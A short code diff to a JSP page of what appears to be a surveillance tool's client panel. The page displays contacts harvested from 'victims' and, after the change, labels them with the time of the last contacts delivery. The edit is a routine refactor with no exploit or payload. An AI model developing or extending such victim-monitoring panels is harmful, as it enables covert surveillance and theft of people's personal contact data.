@@ -5,6 +5,7 @@
 <%@ page import="com.theah64.xrob.api.models.Contact" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
 <%@ page import="com.theah64.xrob.api.database.tables.*" %>
+<%@ page import="com.theah64.xrob.api.models.Delivery" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -50,7 +51,7 @@
 
                 if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {
 
-                    final String lastDelivery = Deliveries.getInstance().getLastDeliveryTime(theVictim.getId());
+                    final String lastUpdatedTime = Deliveries.getInstance().getLastDeliveryTime(Delivery.TYPE_CONTACTS,theVictim.getId());
 
     %>
 
@@ -71,7 +72,7 @@
             <div class="col-md-10 content-centered">
 
                 <%=searchTemplate.getTopTemplate(theVictim.getIdentity(),
-                        lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")")%>
+                        lastUpdatedTime == null ? "(Not yet updated)" : "(last update " + lastUpdatedTime + ")")%>
 
                 <%
                     final List<Contact> contacts = Contacts.getInstance().getAll(theVictim.getId());
